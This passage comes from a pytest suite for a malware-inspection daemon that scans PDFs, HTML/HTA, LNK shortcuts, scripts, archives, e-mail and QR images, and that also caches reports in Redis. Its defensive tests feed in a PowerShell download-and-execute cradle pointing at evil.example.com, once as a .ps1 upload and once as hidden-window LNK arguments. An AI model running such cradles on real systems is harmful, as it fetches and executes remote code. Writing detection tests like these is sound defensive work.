        </body></html>"""
        result = daemon.analyze_html(html)
        assert "WScript.Shell" not in _keywords(result["analyses"])

    def test_hta_encoded_vbscript_is_decoded_and_scanned(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'CreateObject("WScript.Shell")',
        )
        hta = b"""<html><head><HTA:APPLICATION ID="x"/>
        <script language="VBScript.Encode">#@~^encoded^#~@</script>
        </head></html>"""
        result = daemon.analyze_html(hta)
        assert "WScript.Shell" in _keywords(result["analyses"])
        assert "script-decoded" in {
            segment["source"] for segment in result["text_segments"]
        }

    def test_hta_encoded_vbscript_decode_failure_is_reported(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: None,
        )
        hta = b"""<html><head><HTA:APPLICATION ID="x"/>
        <script language="VBScript.Encode">#@~^encoded^#~@</script>
        </head></html>"""
        result = daemon.analyze_html(hta)
        assert "hta-vbscript.encode-undecoded" in _keywords(result["analyses"])


# ===========================================================================
# INTEGRATION TESTS — 'script' detected type flows through analyze_pipeline
# ===========================================================================


class TestScriptTypePipeline:
    @pytest.mark.asyncio
    async def test_ps1_file_detected_and_analysed(self, client):
        payload = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
        resp = await client.post(
            "/v1/scan?filename=run.ps1",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "script"
        # The magic-only detection pass would also match "text" for plain
        # ASCII script source; the redundant "text" analyzer must not run
        # alongside "script" for the same data.
        assert "text" not in body["scan"]["analyzers"]["completed"]
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "download-cradle" in findings

    @pytest.mark.asyncio
    async def test_ps1_falls_back_to_text_when_script_analyzer_disabled(self, client):
        """When xspct_analyzers.script.enabled is False, a .ps1 upload must
        still be scanned by the text analyzer (regression: the magic-only
        detection pass always classifies plain-ASCII script source as
        "text" too, and that "text" entry used to be discarded unconditionally
        as soon as "script" was also detected — even when script was
        disabled — leaving the file completely unanalyzed)."""
        saved = xspct.config["xspct_analyzers"]["script"]["enabled"]
        xspct.config["xspct_analyzers"]["script"]["enabled"] = False
        try:
            payload = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
            resp = await client.post(
                "/v1/scan?filename=run.ps1",
                data=payload,
                headers={"Content-Type": "application/octet-stream"},
            )
        finally:
            xspct.config["xspct_analyzers"]["script"]["enabled"] = saved
        assert resp.status == 200
        body = await resp.json()
        assert "script" not in body["scan"]["analyzers"]["completed"]
        assert "text" in body["scan"]["analyzers"]["completed"]

    def test_archive_ps1_falls_back_to_text_when_script_analyzer_disabled(
        self, daemon, monkeypatch
    ):
        import io
        import zipfile

        monkeypatch.setitem(xspct.config["xspct_analyzers"]["script"], "enabled", False)
        archive_data = io.BytesIO()
        with zipfile.ZipFile(archive_data, "w") as archive:
            archive.writestr("loader.ps1", "whoami")
        result = daemon.analyze_archive("test", "scripts.zip", archive_data.getvalue())
        member = result["archive_files"][0]
        assert member["detected_type"] == "script"
        assert "text" in member["analyzers_run"]
        assert "script" not in member["analyzers_run"]
        assert "text" in {segment["source"] for segment in result["text_segments"]}

    @pytest.mark.asyncio
    async def test_hta_file_detected_as_html(self, client):
        payload = b'<html><head><HTA:APPLICATION SHOWINTASKBAR="no"/></head></html>'
        resp = await client.post(
            "/v1/scan?filename=dropper.hta",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "html"
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "SHOWINTASKBAR" in findings

    @pytest.mark.asyncio
    async def test_script_analyzer_disabled_skips_method(self, aiohttp_client):
        saved = xspct.config["xspct_analyzers"]["script"]["enabled"]
        xspct.config["xspct_analyzers"]["script"]["enabled"] = False
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        try:
            resp = await client.post(
                "/v1/scan?filename=run.ps1",
                data=b"whoami",
                headers={"Content-Type": "application/octet-stream"},
            )
            assert resp.status == 200
        finally:
            xspct.config["xspct_analyzers"]["script"]["enabled"] = saved


class TestLnkTypePipeline:
    @pytest.mark.asyncio
    async def test_lnk_file_detected_and_analysed(self, client):
        payload = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        resp = await client.post(
            "/v1/scan?filename=invoice.lnk",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "lnk"
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "lnk-lolbin-target" in findings
        assert "download-cradle" in findings

    @pytest.mark.asyncio
    async def test_lnk_analyzer_disabled_skips_analysis_and_fallback(
        self, daemon, monkeypatch
    ):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        partial = await daemon.analyze_pipeline(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        assert "lnk" not in partial.report["analyzers_completed"]
        assert partial.report["text_preview"] == []
        fallback.assert_not_called()

    @pytest.mark.asyncio
    async def test_lnk_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        partial = await daemon.analyze_pipeline(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_called_once()
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in partial.report["text_preview"]
        )


# ===========================================================================
# INTEGRATION TESTS — 'text' detected type flows through analyze_pipeline
# ===========================================================================


class TestTextTypePipeline:
    @pytest.mark.asyncio
    async def test_text_file_detected_and_analysed(self, client):
        payload = b"Hello from a plain text file with no special structure."
        resp = await client.post(
            "/v1/scan",
            data=payload,
            headers={
                "Content-Type": "application/octet-stream",
                "X-Filename": "note.txt",
            },
        )
        assert resp.status == 200
        body = await resp.json()
        # detected_type may be 'text' or include 'text'
        dt = body.get("file", {}).get("type", "")
        assert "text" in dt or dt == "unknown"
        assert "content" in body or body.get("file", {}).get("type")

    @pytest.mark.asyncio
    async def test_text_analyzer_disabled_skips_method(self, aiohttp_client):
        saved = xspct.config["xspct_analyzers"]["text"]["enabled"]
        xspct.config["xspct_analyzers"]["text"]["enabled"] = False
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        try:
            payload = b"Plain text content for scan."
            resp = await client.post(
                "/v1/scan",
                data=payload,
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Filename": "note.txt",
                },
            )
            assert resp.status == 200
        finally:
            xspct.config["xspct_analyzers"]["text"]["enabled"] = saved


# ===========================================================================
# FIXTURE-FILE TESTS — PDF with JavaScript
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(PDF_JS_FILE),
    reason="pdf_javascript.pdf not present — run tests/create_fixtures.py",
)
class TestPdfJavascriptFixture:
    """Tests using the generated pdf_javascript.pdf fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(PDF_JS_FILE, "rb").read()

    def test_has_javascript_true(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert r is not None
        assert r["has_javascript"] is True

    def test_has_openaction_true(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert r is not None
        assert r["has_openaction"] is True

    def test_analyses_contains_javascript_entry(self, daemon):
        r = daemon.analyze_pdf(self.data)
        types = [a["type"] for a in r["analyses"]]
        assert "JavaScript" in types

    def test_analyses_contains_suspicious_js(self, daemon):
        r = daemon.analyze_pdf(self.data)
        # analyze_javascript should fire for eval / launchURL / document.write
        keywords = [a["keyword"] for a in r["analyses"]]
        assert any(
            "eval" in kw or "launchURL" in kw or "document.write" in kw
            for kw in keywords
        )

    def test_iocs_contains_evil_url(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert any("evil.example.com" in u for u in r["iocs"]["urls"])

    def test_text_preview_is_list(self, daemon):
        r = daemon.sync_analyze("s", "doc.pdf", self.data, "application/pdf")
        assert isinstance(r["text_preview"], list)

    @pytest.mark.asyncio
    async def test_scan_endpoint_detects_javascript(self, client):
        data = open(PDF_JS_FILE, "rb").read()
        form = aiohttp.FormData()
        form.add_field(
            "doc", data, filename="malware.pdf", content_type="application/pdf"
        )
        resp = await client.post("/v1/scan", data=form)
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "pdf"
        assert body.get("flags", {}).get("javascript", False) is True


# ===========================================================================
# FIXTURE-FILE TESTS — PDF with embedded file
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(PDF_EMBEDDED_FILE),
    reason="pdf_embedded.pdf not present — run tests/create_fixtures.py",
)
class TestPdfEmbeddedFileFixture:
    """Tests using the generated pdf_embedded.pdf fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(PDF_EMBEDDED_FILE, "rb").read()

    def test_has_embedded_files_true(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert r is not None
        assert r["has_embedded_files"] is True

    def test_analyses_contains_embedded_file_entry(self, daemon):
        r = daemon.analyze_pdf(self.data)
        types = [a["type"] for a in r["analyses"]]
        assert "EmbeddedFile" in types

    def test_analyses_mentions_payload_filename(self, daemon):
        r = daemon.analyze_pdf(self.data)
        descriptions = " ".join(a["description"] for a in r["analyses"])
        assert "payload" in descriptions.lower()


# ===========================================================================
# FIXTURE-FILE TESTS — PDF with external URI
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(PDF_URI_FILE),
    reason="pdf_uri.pdf not present — run tests/create_fixtures.py",
)
class TestPdfUriFixture:
    """Tests using the generated pdf_uri.pdf fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(PDF_URI_FILE, "rb").read()

    def test_iocs_contains_uri(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert r is not None
        assert any("evil.example.com" in u for u in r["iocs"]["urls"])

    def test_is_not_encrypted(self, daemon):
        r = daemon.analyze_pdf(self.data)
        assert r["is_encrypted"] is False


# ===========================================================================
# FIXTURE-FILE TESTS — HTML phishing page
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(HTML_PHISHING_FILE),
    reason="html_phishing.html not present — run tests/create_fixtures.py",
)
class TestHtmlPhishingFixture:
    """Tests using the generated html_phishing.html fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(HTML_PHISHING_FILE, "rb").read()

    def test_has_forms(self, daemon):
        r = daemon.analyze_html(self.data)
        assert r is not None
        assert r["has_forms"] is True

    def test_has_iframes(self, daemon):
        r = daemon.analyze_html(self.data)
        assert r["has_iframes"] is True

    def test_has_meta_refresh(self, daemon):
        r = daemon.analyze_html(self.data)
        assert r["has_meta_refresh"] is True

    def test_has_scripts(self, daemon):
        r = daemon.analyze_html(self.data)
        assert r["has_scripts"] is True

    def test_css_hiding_detected(self, daemon):
        r = daemon.analyze_html(self.data)
        types = [a["type"] for a in r["analyses"]]
        # display:none / visibility:hidden / position:absolute should fire
        assert any(
            t in ("CSSHiding", "SuspiciousCSSHiding") or "CSS" in t for t in types
        ), f"No CSS hiding found, types={types}"

    def test_analyses_contains_eval(self, daemon):
        r = daemon.analyze_html(self.data)
        keywords = [a["keyword"] for a in r["analyses"]]
        assert any("eval" in kw for kw in keywords)

    def test_iocs_contain_phishing_url(self, daemon):
        r = daemon.analyze_html(self.data)
        all_urls = " ".join(r["iocs"]["urls"])
        assert "example.com" in all_urls

    def test_base64_blob_detected(self, daemon):
        r = daemon.analyze_html(self.data)
        types = [a["type"] for a in r["analyses"]]
        assert "HTMLSmuggling" in types

    @pytest.mark.asyncio
    async def test_scan_endpoint_phishing_html(self, client):
        data = open(HTML_PHISHING_FILE, "rb").read()
        form = aiohttp.FormData()
        form.add_field("doc", data, filename="invoice.html", content_type="text/html")
        resp = await client.post("/v1/scan", data=form)
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "html"
        assert body.get("flags", {}).get("forms", False) is True
        assert body.get("flags", {}).get("iframes", False) is True


# ===========================================================================
# FIXTURE-FILE TESTS — Mixed ZIP archive
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(ARCHIVE_MIXED_FILE),
    reason="archive_mixed.zip not present — run tests/create_fixtures.py",
)
class TestArchiveMixedFixture:
    """Tests using the generated archive_mixed.zip fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(ARCHIVE_MIXED_FILE, "rb").read()

    def test_archive_files_extracted(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        assert r is not None
        assert len(r["archive_files"]) >= 3

    def test_readme_txt_in_archive_files(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        names = [f["name"] for f in r["archive_files"]]
        assert "readme.txt" in names

    def test_nested_pdf_in_archive_files(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        names = [f["name"] for f in r["archive_files"]]
        assert any(n.endswith(".pdf") for n in names)

    def test_ioc_extracted_from_text_member(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        all_urls = " ".join(r["iocs"]["urls"])
        assert "ioc-from-archive.example.com" in all_urls

    def test_report_has_required_keys(self, daemon):
        r = daemon.analyze_archive("s", "archive_mixed.zip", self.data)
        assert r is not None
        for key in (
            "archive_files",
            "analyses",
            "iocs",
            "yara_matches",
            "iocs_extended",
        ):
            assert key in r

    def test_detected_as_archive_type(self, daemon):
        t = daemon.get_detected_type("application/zip", None, "archive_mixed.zip", None)
        assert t == "archive"

    @pytest.mark.asyncio
    async def test_scan_endpoint_archive(self, client):
        data = open(ARCHIVE_MIXED_FILE, "rb").read()
        form = aiohttp.FormData()
        form.add_field(
            "doc", data, filename="archive_mixed.zip", content_type="application/zip"
        )
        resp = await client.post("/v1/scan", data=form)
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "archive"
        assert isinstance(
            body.get("engines", {}).get("archive", {}).get("files", []), list
        )
        assert len(body.get("engines", {}).get("archive", {}).get("files", [])) >= 1


# ===========================================================================
# FIXTURE-FILE TESTS — EML e-mail with attachment
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(EML_FILE),
    reason="email_with_attachment.eml not present — run tests/create_fixtures.py",
)
class TestEmlFixture:
    """Tests using the generated email_with_attachment.eml fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(EML_FILE, "rb").read()

    def test_eml_detected_as_archive(self, daemon):
        # EML routes to 'archive' so sflock2 can extract attachments
        t = daemon.get_detected_type("message/rfc822", None, "test.eml", None)
        assert t == "archive"

    def test_eml_extension_detected_as_archive(self, daemon):
        t = daemon.get_detected_type(None, None, "email_with_attachment.eml", None)
        assert t == "archive"

    def test_msg_extension_detected_as_archive(self, daemon):
        t = daemon.get_detected_type(None, None, "outlook_item.msg", None)
        assert t == "archive"

    def test_eml_bytes_are_non_empty(self):
        # Sanity: fixture file was created successfully
        assert len(self.data) > 100

    @pytest.mark.skipif(not xspct.HAS_SFLOCK, reason="sflock2 not installed")
    def test_sflock_extracts_eml_attachment(self, daemon):
        """Integration test: sflock2 extracts the attachment from the EML."""
        r = daemon.analyze_archive("s", "email_with_attachment.eml", self.data)
        assert r is not None
        names = [f["name"] for f in r["archive_files"]]
        assert any("invoice" in n.lower() or "pdf" in n.lower() for n in names)


# ===========================================================================
# FIXTURE-FILE TESTS — QR code image
# ===========================================================================


@pytest.mark.skipif(
    not os.path.exists(QR_FILE),
    reason="qr_code.png not present — install qrcode or segno and run tests/create_fixtures.py",
)
class TestQrCodeFixture:
    """Tests using the generated qr_code.png fixture."""

    @pytest.fixture(autouse=True)
    def _data(self):
        self.data = open(QR_FILE, "rb").read()

    def test_detected_as_image(self, daemon):
        t = daemon.get_detected_type("image/png", None, "qr_code.png", None)
        assert t == "image"

    @pytest.mark.skipif(not xspct.HAS_PYZBAR, reason="pyzbar not installed")
    def test_qr_code_decoded(self, daemon):
        r = daemon.analyze_image(self.data, label="qr_code.png")
        assert r is not None
        assert len(r["qr_codes"]) >= 1
        assert any("qr-malware.example.com" in v for v in r["qr_codes"])

    @pytest.mark.skipif(not xspct.HAS_PYZBAR, reason="pyzbar not installed")
    def test_qr_ioc_url_extracted(self, daemon):
        r = daemon.analyze_image(self.data, label="qr_code.png")
        all_urls = r["iocs"]["urls"]
        assert any("qr-malware.example.com" in u for u in all_urls)


# ===========================================================================
# UNIT TESTS — Redis cache (fakeredis)
# ===========================================================================


@pytest.mark.skipif(not _HAS_FAKEREDIS, reason="fakeredis not installed")
class TestRedisCache:
    """Tests for get_cached_report / cache_report using a fakeredis backend."""

    @pytest.fixture(autouse=True)
    def _setup(self, daemon):
        self.daemon = daemon
        saved = dict(xspct.config["xspct_redis_cache"])
        xspct.config["xspct_redis_cache"]["enabled"] = True
        xspct.config["xspct_redis_cache"]["expire"] = 3600
        xspct.config["xspct_redis_cache"]["prefix"] = "xspct:"
        xspct.config["xspct_redis_cache"]["max_errors"] = 3
        self.daemon.redis_pool = fakeredis.FakeAsyncRedis(decode_responses=True)
        self.daemon._redis_error_count = 0
        yield
        xspct.config["xspct_redis_cache"].update(saved)
        self.daemon.redis_pool = None

    async def test_cache_miss_returns_none(self):
        result = await self.daemon.get_cached_report("s", "a" * 64)
        assert result is None

    async def test_cache_hit_returns_report(self):
        report = {"hash": "a" * 64, "verdict": "clean"}
        await self.daemon.cache_report("s", "a" * 64, report)
        result = await self.daemon.get_cached_report("s", "a" * 64)
        assert result == report

    async def test_cache_report_sets_ttl(self):
        report = {"hash": "b" * 64}
        await self.daemon.cache_report("s", "b" * 64, report)
        ttl = await self.daemon.redis_pool.ttl("xspct:" + "b" * 64)
        assert 0 < ttl <= 3600

    async def test_cache_report_also_stored_in_tasks(self):
        report = {"hash": "c" * 64}
        await self.daemon.cache_report("s", "c" * 64, report)
        assert "c" * 64 in self.daemon.tasks

    async def test_invalidate_deletes_redis_and_in_memory_report(self):
        file_hash = "l" * 64
        await self.daemon.cache_report("s", file_hash, {"hash": file_hash})

        await self.daemon.invalidate_cached_report("s", file_hash)

        assert file_hash not in self.daemon.tasks
        assert await self.daemon.redis_pool.get("xspct:" + file_hash) is None

    async def test_invalidate_removes_in_memory_report_when_redis_disabled(self):
        file_hash = "m" * 64
        self.daemon._store_terminal_result(file_hash, {"hash": file_hash})
        xspct.config["xspct_redis_cache"]["enabled"] = False

        await self.daemon.invalidate_cached_report("s", file_hash)

        assert file_hash not in self.daemon.tasks

    async def test_invalidated_in_flight_report_cannot_repopulate_cache(self):
        file_hash = "o" * 64
        stale_generation = self.daemon._cache_generations.get(file_hash, 0)

        await self.daemon.invalidate_cached_report("s", file_hash)
        await self.daemon.cache_report(
            "s", file_hash, {"hash": file_hash}, stale_generation
        )

        assert file_hash not in self.daemon.tasks
        assert await self.daemon.redis_pool.get("xspct:" + file_hash) is None
        assert await self.daemon.redis_pool.ttl("xspct:gen:" + file_hash) == -1

    async def test_cache_miss_increments_stat(self):
        initial = xspct.stats["redis_misses"]
        await self.daemon.get_cached_report("s", "d" * 64)
        assert xspct.stats["redis_misses"] == initial + 1

    async def test_cache_hit_increments_stat(self):
        report = {"hash": "e" * 64}
        await self.daemon.cache_report("s", "e" * 64, report)
        initial = xspct.stats["redis_hits"]
        await self.daemon.get_cached_report("s", "e" * 64)
        assert xspct.stats["redis_hits"] == initial + 1

    async def test_disabled_skips_lookup(self):
        xspct.config["xspct_redis_cache"]["enabled"] = False
        result = await self.daemon.get_cached_report("s", "f" * 64)
        assert result is None

    async def test_disabled_skips_store(self):
        xspct.config["xspct_redis_cache"]["enabled"] = False
        await self.daemon.cache_report("s", "g" * 64, {"hash": "g" * 64})
        # key must not exist in fake redis
        raw = await self.daemon.redis_pool.get("xspct:" + "g" * 64)
        assert raw is None

    async def test_circuit_breaker_open_returns_none(self):
        self.daemon._redis_error_count = 10  # exceeds max_errors (3)
        result = await self.daemon.get_cached_report("s", "h" * 64)
        assert result is None

    async def test_circuit_breaker_resets_after_success(self):
        self.daemon._redis_error_count = 1
        report = {"hash": "i" * 64}
        await self.daemon.cache_report("s", "i" * 64, report)
        await self.daemon.get_cached_report("s", "i" * 64)
        assert self.daemon._redis_error_count == 0

    async def test_get_error_increments_error_count(self):
        broken = AsyncMock()
        broken.get = AsyncMock(side_effect=ConnectionError("redis down"))
        self.daemon.redis_pool = broken
        result = await self.daemon.get_cached_report("s", "j" * 64)
        assert result is None
        assert self.daemon._redis_error_count == 1
        assert xspct.stats["redis_errors"] == 1

    async def test_set_error_increments_error_count(self):
        broken = AsyncMock()
        broken.setex = AsyncMock(side_effect=ConnectionError("redis down"))
        self.daemon.redis_pool = broken
        await self.daemon.cache_report("s", "k" * 64, {"hash": "k" * 64})
        assert self.daemon._redis_error_count == 1
        assert xspct.stats["redis_errors"] == 1

    async def test_delete_error_increments_error_count(self):
        broken = AsyncMock()
        broken.eval = AsyncMock(side_effect=ConnectionError("redis down"))
        self.daemon.redis_pool = broken
        await self.daemon.invalidate_cached_report("s", "n" * 64)
        assert self.daemon._redis_error_count == 1
        assert xspct.stats["redis_errors"] == 1

    async def test_cross_process_invalidate_blocks_stale_write(self):
        """A peer daemon process's invalidation must be visible via Redis,
        even though it never touched this process's local generation dict.
        """
        file_hash = "p" * 64
        peer = xspct.InspectorDaemon()
        peer.redis_pool = self.daemon.redis_pool  # shared cache, separate process

        # In-flight scan on self.daemon captures the generation before the
        # peer process invalidates the file.
        stale_generation = await self.daemon.get_cache_generation("s", file_hash)
        assert stale_generation == 0

        await peer.invalidate_cached_report("s", file_hash)
        # self.daemon's local dict never saw the peer's invalidation.
        assert self.daemon._cache_generations.get(file_hash, 0) == 0

        await self.daemon.cache_report(
            "s", file_hash, {"hash": file_hash}, stale_generation
        )

        assert await self.daemon.redis_pool.get("xspct:" + file_hash) is None
        assert file_hash not in self.daemon.tasks

    async def test_cross_process_fresh_write_still_cached(self):
        """A generation captured after the peer's invalidation must still be
        cacheable — the guard must not reject every write once any
        invalidation has ever happened.
        """
        file_hash = "q" * 64
        peer = xspct.InspectorDaemon()
        peer.redis_pool = self.daemon.redis_pool

        await peer.invalidate_cached_report("s", file_hash)
        fresh_generation = await self.daemon.get_cache_generation("s", file_hash)

        await self.daemon.cache_report(
            "s", file_hash, {"hash": file_hash}, fresh_generation
        )

        assert await self.daemon.redis_pool.get("xspct:" + file_hash) is not None

    async def test_run_script_uses_evalsha_when_sha_cached(self):
        """A pre-loaded SHA is used directly, without sending the script body."""
        sha = await self.daemon.redis_pool.script_load(
            xspct.InspectorDaemon._INVALIDATE_SCRIPT
        )
        self.daemon._invalidate_script_sha = sha
        evalsha = self.daemon.redis_pool.evalsha
        self.daemon.redis_pool.evalsha = MagicMock(wraps=evalsha)
        self.daemon.redis_pool.eval = MagicMock(
            side_effect=AssertionError("should not fall back to EVAL")
        )

        file_hash = "r" * 64
        await self.daemon.invalidate_cached_report("s", file_hash)

        assert self.daemon._invalidate_script_sha == sha
        self.daemon.redis_pool.evalsha.assert_called_once()
        self.daemon.redis_pool.eval.assert_not_called()
        assert self.daemon._redis_error_count == 0

    async def test_run_script_falls_back_and_recaches_sha_on_noscript(self):
        """An unrecognised (or never-loaded) SHA transparently falls back to
        EVAL and re-caches a fresh SHA for subsequent calls."""
        self.daemon._invalidate_script_sha = "0" * 40  # bogus/expired SHA
        eval = self.daemon.redis_pool.eval
        script_load = self.daemon.redis_pool.script_load
        self.daemon.redis_pool.eval = MagicMock(wraps=eval)
        self.daemon.redis_pool.script_load = MagicMock(wraps=script_load)

        file_hash = "t" * 64
        await self.daemon.cache_report("s", file_hash, {"hash": file_hash})
        await self.daemon.invalidate_cached_report("s", file_hash)

        assert await self.daemon.redis_pool.get("xspct:" + file_hash) is None
        assert self.daemon._invalidate_script_sha != "0" * 40
        assert self.daemon._invalidate_script_sha
        self.daemon.redis_pool.eval.assert_called_once()
        self.daemon.redis_pool.script_load.assert_called_once_with(
            xspct.InspectorDaemon._INVALIDATE_SCRIPT
        )

    async def test_setup_loads_lua_scripts(self, monkeypatch):
        """Startup loads both script bodies and retains their Redis SHAs."""
        pool = fakeredis.FakeAsyncRedis(decode_responses=True)
        script_load = pool.script_load
        pool.script_load = MagicMock(wraps=script_load)
        redis_module = MagicMock()
        redis_module.from_url.return_value = pool
        monkeypatch.setattr(xspct, "redis", redis_module)
        monkeypatch.setattr(xspct, "HAS_REDIS", True)
        daemon = xspct.InspectorDaemon()

        await daemon.setup()

        assert pool.script_load.call_args_list == [
            ((xspct.InspectorDaemon._INVALIDATE_SCRIPT,), {}),
            ((xspct.InspectorDaemon._CACHE_STORE_SCRIPT,), {}),
        ]
        assert daemon._invalidate_script_sha
        assert daemon._cache_store_script_sha
        await daemon.teardown()


@pytest.mark.skipif(not _HAS_FAKEREDIS, reason="fakeredis not installed")
class TestInvalidateCache:
    """/v1/scan?invalidate_cache=true and metadata.invalidate_cache."""

    @pytest.fixture(autouse=True)
    def _setup_redis(self, client):
        d = client.app["daemon"]
        saved = dict(xspct.config["xspct_redis_cache"])
        xspct.config["xspct_redis_cache"]["enabled"] = True
        xspct.config["xspct_redis_cache"]["expire"] = 3600
        xspct.config["xspct_redis_cache"]["prefix"] = "xspct:"
        xspct.config["xspct_redis_cache"]["max_errors"] = 3
        d.redis_pool = fakeredis.FakeAsyncRedis(decode_responses=True)
        d._redis_error_count = 0
        yield
        xspct.config["xspct_redis_cache"].update(saved)
        d.redis_pool = None

    async def test_query_discards_peer_invalidated_local_report(self, client):
        """A completed local report cannot outlive a peer's Redis deletion."""
        daemon = client.app["daemon"]
        file_hash = "f" * 64
        await daemon.cache_report("s", file_hash, {"hash": file_hash})
        peer = xspct.InspectorDaemon()
        peer.redis_pool = daemon.redis_pool

        await peer.invalidate_cached_report("s", file_hash)
        response = await client.get(f"/v1/query?hash={file_hash}")

        assert response.status == 404
        assert (await response.json())["status"] == "not_found"
        assert file_hash not in daemon.tasks

    async def test_query_discards_redis_rejected_completed_task(self, client):
        """A completed task whose Redis write lost the race is not served."""
        daemon = client.app["daemon"]
        file_hash = "e" * 64
        stale_generation = await daemon.get_cache_generation("s", file_hash)

        async def completed_report():
            return {"hash": file_hash}

        task = asyncio.create_task(completed_report())
        await task
        daemon.tasks[file_hash] = task
        peer = xspct.InspectorDaemon()
        peer.redis_pool = daemon.redis_pool
        await peer.invalidate_cached_report("s", file_hash)
        await daemon.cache_report("s", file_hash, {"hash": file_hash}, stale_generation)

        response = await client.get(f"/v1/query?hash={file_hash}")

        assert response.status == 404
        assert (await response.json())["status"] == "not_found"
        assert file_hash not in daemon.tasks

    async def test_second_request_is_cache_hit(self, client):
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "inv1.pdf"))
        assert r1.status == 200
        b1 = await r1.json()
        assert "cache_hit" not in b1
        assert b1["scan"]["cache_hit"] is False

        r2 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "inv1.pdf"))
        assert r2.status == 200
        b2 = await r2.json()
        assert b2.get("cache_hit") is True

    async def test_invalidate_cache_query_param_forces_rescan(self, client):
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "inv2.pdf"))
        assert r1.status == 200

        r2 = await client.post(
            "/v1/scan?invalidate_cache=true", data=_form(PDF_CLEAN, "inv2.pdf")
        )
        assert r2.status == 200
        b2 = await r2.json()
        assert "cache_hit" not in b2
        assert b2["scan"]["cache_hit"] is False

    async def test_invalidate_cache_metadata_field_forces_rescan(self, client):
        r1 = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "inv3.pdf", {})
        )
        assert r1.status == 200

        r2 = await client.post(
            "/v1/scan",
            data=_metadata_form(PDF_CLEAN, "inv3.pdf", {"invalidate_cache": True}),
        )
        assert r2.status == 200
        b2 = await r2.json()
        assert "cache_hit" not in b2
        assert b2["scan"]["cache_hit"] is False

    async def test_invalidate_cache_metadata_field_must_be_boolean(self, client):
        response = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN, "invalid.pdf", {"invalidate_cache": "false"}
            ),
        )

        assert response.status == 400
        body = await response.json()
        assert body["error"] == 'metadata field "invalidate_cache" must be a boolean'

    async def test_invalidate_cache_metadata_overrides_query_param(self, client):
        """metadata.invalidate_cache=false must win over ?invalidate_cache=true
        (metadata fields always take precedence over query parameters)."""
        r1 = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "inv4.pdf", {})
        )
        assert r1.status == 200

        r2 = await client.post(
            "/v1/scan?invalidate_cache=true",
            data=_metadata_form(PDF_CLEAN, "inv4.pdf", {"invalidate_cache": False}),
        )
        assert r2.status == 200
        b2 = await r2.json()
        assert b2.get("cache_hit") is True

    async def test_without_invalidate_cache_default_is_cache_hit(self, client):
        """Absence of invalidate_cache must not change existing cache-hit behavior."""
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "inv5.pdf"))
        assert r1.status == 200
        r2 = await client.post(
            "/v1/scan?invalidate_cache=false", data=_form(PDF_CLEAN, "inv5.pdf")
        )
        assert r2.status == 200
        b2 = await r2.json()
